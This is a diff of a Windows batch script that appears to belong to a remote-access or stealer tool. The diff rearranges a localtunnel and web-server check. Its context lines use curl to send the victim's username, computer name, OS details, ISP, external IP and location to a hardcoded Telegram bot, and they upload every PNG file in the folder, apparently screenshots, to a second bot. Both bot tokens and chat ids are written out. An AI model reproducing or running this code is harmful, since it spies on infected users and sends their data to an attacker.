@@ -59,11 +59,8 @@ if exist "%temp%\localtunnel.txt" (
    for /f "tokens=3* delims=:" %%a in ('type %temp%\localtunnel.txt') do (
   set URI=%%b)
 ) else (
-   set "LocalTunnel=N/A"
+   echo.
 )
-
-tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
-if not errorlevel 1 (echo.) else (taskkill /f /im "Localtunnel.exe" && set "LocalTunnel=Off")
 
 setlocal enableDelayedExpansion
 set temporary=%temp%
@@ -72,6 +69,9 @@ for %%f IN (%temporary:~3%/playlist.m3u8) DO (
   set newtemp=!oldtemp:\=/! 
   set WS=%URI:~0,-1%
 )
+
+tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
+if not errorlevel 1 (echo.) else (taskkill /f /im "Localtunnel.exe" && set WS=Off && set "newtemp=Not available")
 
 "%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS% ] [Live Stream: %WS%!newtemp!] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
 for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759 
